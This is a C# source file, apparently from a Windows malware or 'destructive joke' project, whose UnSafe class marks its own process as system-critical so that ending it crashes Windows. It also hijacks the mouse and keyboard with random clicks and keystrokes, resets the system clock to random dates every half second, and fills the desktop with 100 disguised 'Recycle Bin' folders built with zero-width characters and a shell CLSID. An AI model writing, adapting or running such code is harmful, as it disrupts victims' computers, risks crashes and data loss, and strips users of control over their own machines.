using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.IO;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using static The_Nightmare_of_the_Window.api;
using static The_Nightmare_of_the_Window.function;

namespace The_Nightmare_of_the_Window
{
    internal class UnSafe
    {
        public static void UTCTime()
        {
            while (true) 
            {
                int year = Randint(0, 9999);
                int month = Randint(1, 12);
                // 获取当月合法最大日期
                int maxDay = DateTime.DaysInMonth(year, month);
                int day = Randint(1, maxDay);

                SYSTEMTIME TIME = new SYSTEMTIME()
                {
                    wYear = (ushort)year,
                    wMonth = (ushort)month,
                    wDay = (ushort)day,
                    wHour = (ushort)Randint(0, 23),
                    wMinute = (ushort)Randint(0, 59),
                    wSecond = (ushort)Randint(0, 59),
                    wMilliseconds = (ushort)Randint(0, 999)
                };
                SetSystemTime(ref TIME);
                Sleep(500);
            }
        }
        public static void Run_UnSafe()
        {
            int isCritical = 1;
            int BreakOnTermination = 0x1D;
            NtSetInformationProcess(Process.GetCurrentProcess().Handle, BreakOnTermination, ref isCritical, sizeof(int));
            NewThread(Mouse);
            NewThread(Keyboard);
            NewThread(UTCTime);
            Files_Directorys();
        }
        public static void Mouse()
        {
            while (true)
            {
                SetCursorPos(RandX(), RandY());
                mouse_event(MOUSEEVENTF_LEFTDOWN, 0, 0, 0, 0);
                mouse_event(MOUSEEVENTF_LEFTUP, 0, 0, 0, 0);
                Sleep(40);
            }
        }
        public static void Keyboard()
        {
            while (true)
            {
                byte key = (byte)Randint(0x41, 0x5A);
                keybd_event(key, 0, KEYEVENTF_KEYDOWN, UIntPtr.Zero);
                Sleep(1);
                keybd_event(key, 0, KEYEVENTF_KEYUP, UIntPtr.Zero);
                Sleep(40);
            }
        }
        public static void Files_Directorys()
        {
            try
            {
                string dsk_path = Environment.GetFolderPath(Environment.SpecialFolder.Desktop);
                for(int _ = 0;_ < 100; _++)
                {
                    string directory_path = dsk_path + $"\\Recycle Bin{new string('\u200B', _)}." + "{645FF040-5081-101B-9F08-00AA002F954E}";
                    Directory.CreateDirectory(directory_path);
                    DirectoryInfo dir = new DirectoryInfo(directory_path);
                    dir.CreationTime = new DateTime(9999, 12, 31, 23, 59, 59);
                    dir.LastWriteTime = new DateTime(9999, 12, 31, 23, 59, 59);
                    dir.LastAccessTime = new DateTime(9999, 12, 31, 23, 59, 59);
                }

            }
            catch (Exception) { }
        }
    }
}
